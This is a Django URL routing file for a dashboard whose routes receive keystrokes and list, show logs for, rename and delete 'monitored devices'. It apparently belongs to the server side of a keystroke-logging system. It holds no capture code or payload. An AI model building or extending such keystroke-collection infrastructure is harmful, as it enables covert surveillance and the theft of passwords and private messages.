# dashboard/urls.py
from django.urls import path
from . import views

app_name = 'dashboard'

urlpatterns = [
    path('', views.dashboard_home, name='home'),
    path('api/log/', views.receive_keystrokes, name='api_receive_keystrokes'), # This will become /dashboard/api/log/
    path('api/devices/', views.list_monitored_devices, name='api_list_devices'),
    path('api/devices/<int:device_id>/logs/', views.get_device_logs, name='api_device_logs'),
    path('api/devices/<int:device_id>/rename/', views.rename_device, name='api_rename_device'),
    path('api/devices/<int:device_id>/delete/', views.delete_device, name='api_delete_device'),
]